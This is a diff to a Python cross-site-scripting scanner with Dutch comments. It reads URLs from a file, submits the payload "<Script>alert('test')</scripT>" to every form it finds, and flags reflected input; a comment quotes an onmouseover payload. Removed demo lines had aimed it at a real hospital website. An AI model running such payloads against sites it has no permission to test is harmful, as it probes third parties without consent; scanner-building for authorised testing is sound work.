@@ -50,33 +50,45 @@ def submit_form(form_details, url, value):
         # controleren op GET method
         return requests.get(target_url, params=data)
 
-def scan_xss(url):
+def scan_xss():
     # alle forms binnen de URL ophalen dmv bovenstaande functie
-    forms = get_all_forms(url)
-    # print(forms)
-    print(f"[+] {len(forms)} forms gevonden op {url}.")
-    # meerdere soorten toevoegen -- mogelijk lezen vanuit .txt?
-    js_script = "<Script>alert('test')</scripT>"
-    # waarde teruggeven
-    is_vulnerable = False
-    # alle gevonden forms in de URL proberen
-    for form in forms:
-        form_details = get_form_details(form)
-        content = submit_form(form_details, url, js_script).content.decode()
-        if js_script in content:
-            print(f"[+] XSS-kwetsbaarheid gevonden op {url}")
-            print(f"[*] Form details:")
-            pprint(form_details)
-            is_vulnerable = True
-    if is_vulnerable == False:
-        print(f'[i] {url} is niet kwetsbaar voor XSS-scripting.')
-        # return is_vulnerable
 
+    with open('src\\data\\urls.txt', 'r') as url_file:
+        form_urls = []
+        for line in url_file:
+            line = line.strip()
+            form_urls.append(line)
+    # print(form_urls)
+
+    for url in form_urls:
+        print(url)
+        forms = get_all_forms(url)
+        # print(forms)
+        print(f"[+] {len(forms)} forms gevonden op {url}")
+        # meerdere soorten toevoegen -- mogelijk meerdere vectors lezen vanuit .txt
+        # <b onmouseover=alert('Wufff!')>click me!</b> @ https://xss-game.appspot.com/level2
+        js_script = "<Script>alert('test')</scripT>"
+        # waarde teruggeven
+        is_vulnerable = False
+        # alle gevonden forms in de URL proberen
+        for form in forms:
+            form_details = get_form_details(form)
+            content = submit_form(form_details, url, js_script).content.decode()
+            if js_script in content:
+                print(f"[+] XSS-kwetsbaarheid gevonden op {url}")
+                print(f"[*] Form details:")
+                pprint(form_details)
+                is_vulnerable = True
+        if is_vulnerable == False:
+            print(f'[i] {url} is niet kwetsbaar voor XSS-scripting.')
+            print(is_vulnerable)
+
+scan_xss()
 # demo
-startTime = time.time()
-scan_xss('https://www.martiniziekenhuis.nl')
-result = scan_xss('http://sudo.co.il/xss/level0.php')
-totalTime = time.time() - startTime
-print(totalTime)
+# startTime = time.time()
+# scan_xss('https://www.martiniziekenhuis.nl')
+# result = scan_xss('http://sudo.co.il/xss/level0.php')
+# totalTime = time.time() - startTime
+# print(totalTime)
 
 # print(scan_xss('https://www.martiniziekenhuis.nl'))
